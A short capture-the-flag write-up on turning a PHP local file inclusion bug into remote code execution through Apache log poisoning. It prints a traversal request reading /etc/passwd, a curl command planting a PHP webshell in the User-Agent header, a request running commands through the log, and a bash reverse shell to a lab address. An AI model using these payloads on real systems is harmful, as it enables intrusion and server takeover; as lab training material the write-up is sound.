From LFI to RCE via Log Poisoning

Chaining a local file inclusion bug in a PHP app into full remote code execution using Apache log poisoning.

Recon

Started with a standard service scan. Port 80 was running a PHP web app with a page GET parameter used for routing between pages. 

nmap -sV -sC -p 80 target.htb

Finding the LFI

Fuzzing the page parameter with path traversal sequences revealed that the app was including files directly from disk without sanitisation. 

GET /index.php?page=../../../../etc/passwd HTTP/1.1
Host: target.htb

Response returned a valid /etc/passwd — classic LFI confirmed.

Log Poisoning for RCE

Since Apache logs were readable at /var/log/apache2/access.log, I injected a PHP webshell into the User-Agent header and then included the log file to trigger execution. 

# Inject payload into User-Agent
curl -s "http://target.htb/" -A "<?php system(\$_GET['cmd']); ?>"

# Execute via LFI
curl "http://target.htb/index.php?page=../../../../var/log/apache2/access.log&cmd=id"

Reverse Shell

From there, URL-encoded a bash reverse shell and caught it on a netcat listener.

bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'

Takeaway

Log poisoning works when two conditions align — an LFI that can read log files, and a web server writing attacker-controlled input into those logs. Always sanitise include paths and disable error-based disclosure in production.
